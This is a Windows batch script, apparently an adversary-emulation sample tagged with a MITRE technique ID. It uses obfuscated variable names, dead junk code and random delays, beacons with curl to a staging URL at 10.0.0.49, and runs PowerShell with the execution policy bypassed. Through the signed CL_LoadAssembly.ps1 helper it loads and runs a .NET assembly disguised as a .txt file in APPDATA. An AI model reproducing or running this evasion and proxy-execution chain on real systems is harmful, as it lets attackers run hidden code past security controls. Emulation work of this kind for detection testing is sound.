@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET txisnba=%APPDATA%\8692\bd70dd16
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8692-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=wimrar.txt
SET dvhhyc=8692
SET yfglpqm=%APPDATA%\!rrocubc!\macula-simulations.log
SET xcjdsad=https://10.0.0.49/stage/2/icon.png?8692-7
SET mltnxs=0
SET wlmnbv=C:\Windows\diagnostics\system\Audio

echo [!DATE:/=-! !TIME:,=.!][DEBUG][!jwcnifl!]: script_start>> "!yfglpqm!" 2>nul
choice /C Y /N /D Y /T 45 >nul
echo [!DATE:/=-! !TIME:,=.!][DEBUG][!jwcnifl!]: delay_initial_complete>> "!yfglpqm!" 2>nul
GOTO zxqpgw

:junk_fkmwp
REM Dead code block
SET zcbd=dead
GOTO END

:zxqpgw
IF !mltnxs!==0 GOTO lfkvjn
IF !mltnxs!==17 GOTO pqrthm
IF !mltnxs!==33 GOTO tnxwqj
IF !mltnxs!==48 GOTO mhdgfb
IF !mltnxs!==99 GOTO END
GOTO zxqpgw

:dead_rsyvt
echo Never executed>>nul
EXIT

:lfkvjn
echo [!DATE:/=-! !TIME:,=.!][DEBUG][!jwcnifl!]: heartbeat_start>> "!yfglpqm!" 2>nul
curl -k -s -o nul "!xcjdsad!"
echo [!DATE:/=-! !TIME:,=.!][DEBUG][!jwcnifl!]: heartbeat_complete>> "!yfglpqm!" 2>nul
SET mltnxs=17
ping -n 8 127.0.0.1 >nul
GOTO zxqpgw

:tnxwqj
SET /A wqkpll=!RANDOM! %% 15 + 8
echo [!DATE:/=-! !TIME:,=.!][DEBUG][!jwcnifl!]: delay_random_start=!wqkpll!s>> "!yfglpqm!" 2>nul
timeout /t !wqkpll! /nobreak >nul
echo [!DATE:/=-! !TIME:,=.!][DEBUG][!jwcnifl!]: delay_random_complete>> "!yfglpqm!" 2>nul
SET mltnxs=48
GOTO zxqpgw

:dead_ypdcz
REM Unreachable junk code
SET fakevar=junkvalue
GOTO END

:pqrthm
echo [!DATE:/=-! !TIME:,=.!][DEBUG][!jwcnifl!]: chdir_start>> "!yfglpqm!" 2>nul
cd /d "!wlmnbv!"
echo [!DATE:/=-! !TIME:,=.!][DEBUG][!jwcnifl!]: chdir_complete=!cd!>> "!yfglpqm!" 2>nul
SET mltnxs=33
timeout /t 12 /nobreak >nul
GOTO zxqpgw

:junk_tzqrw
EXIT /B 1

:mhdgfb
echo [!DATE:/=-! !TIME:,=.!][DEBUG][!jwcnifl!]: exec_start>> "!yfglpqm!" 2>nul
SET rslttt=1
SET errdtl=
powershell.exe -ep bypass -command "set-location -path !wlmnbv!; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath '!txisnba!\\!xzanpex!';[Program]::Dale()"
IF NOT !ERRORLEVEL!==0 SET rslttt=0&SET errdtl=assembly_load_failed
echo [!DATE:/=-! !TIME:,=.!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Trusted Developer Utilities Proxy Execution=!rslttt!:!errdtl!>> "!yfglpqm!" 2>nul
echo [!DATE:/=-! !TIME:,=.!][DEBUG][!jwcnifl!]: exec_complete=!ERRORLEVEL!>> "!yfglpqm!" 2>nul
SET mltnxs=99
GOTO zxqpgw

:dead_vbfnc
REM Another dead block
GOTO END

:END
echo [!DATE:/=-! !TIME:,=.!][DEBUG][!jwcnifl!]: script_end>> "!yfglpqm!" 2>nul
ENDLOCAL